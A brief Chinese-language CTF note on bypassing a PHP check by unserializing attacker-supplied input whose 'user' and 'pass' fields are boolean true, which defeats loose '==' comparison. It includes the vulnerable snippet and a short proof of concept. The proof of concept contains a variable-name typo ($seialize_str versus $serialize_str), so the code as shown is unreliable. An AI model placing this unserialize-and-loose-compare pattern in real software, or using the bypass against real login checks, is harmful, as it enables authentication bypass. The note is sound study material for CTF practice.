# php bool

## 反序列 布尔判断

* example

’‘’php
$flag='ctf_flag';
$unserialize_str = $_POST['password'];
$data_unserialize = unserialize($unserialize_str);
if($data_unserialize['user'] == '???' && $data_unserialize['pass']=='???')
{
    print_r($flag);
}
'''

user, pass 的值是未知的，条件判断时使 $data_unserialize['user']=true ， $data_unserialize['pass']=true 即可

* poc

'''php
$arr =  array();
$arr['user']=TRUE;
$arr['pass']=TRUE;
$seialize_str = serialize($arr);
$flag='ctf_flag';
$data_unserialize = unserialize($serialize_str);
if($data_unserialize['user'] == '???' && $data_unserialize['pass']=='???')
{
    print_r($flag);
}
'''
